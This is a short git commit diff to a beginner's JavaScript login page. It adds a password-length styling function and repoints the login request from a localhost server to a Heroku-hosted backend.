9983a583957a9a6cb1f7a0a02a8e408782d50ae8
Japneet Singh <jpntsingh8@gmail.com>
2020-11-14 16:24:41 +0530

    changed stuff

--- file.js
+++ file.js
@@ -1,17 +1,25 @@
-let fs = require("browserify-fs")
+function style_byID_Blue_short_p () {
+    var textIn = pass.value
+    var txtLen = textIn.length;
+    console.log("hey")
+    if( txtLen>8 ){
+        log.className += ' blue'; //turn it blue
+    } else {
+        log.classList.remove('blue')
+    }
+}
 
+document.addEventListener('onload', style_byID_Blue_short_p);
 let id = document.querySelector(".id")
 let pass = document.querySelector(".password")
 let log = document.querySelector(".button")
-
-
 
 log.addEventListener("click", () => {
     let user = {
         "id": id.value,
         "pass": pass.value 
     }
-    fetch("http://127.0.0.1:5000/login", {
+    fetch("https://insta-api-heroku.herokuapp.com/login", {
         method: 'post',
         body: JSON.stringify(user),
         headers: {
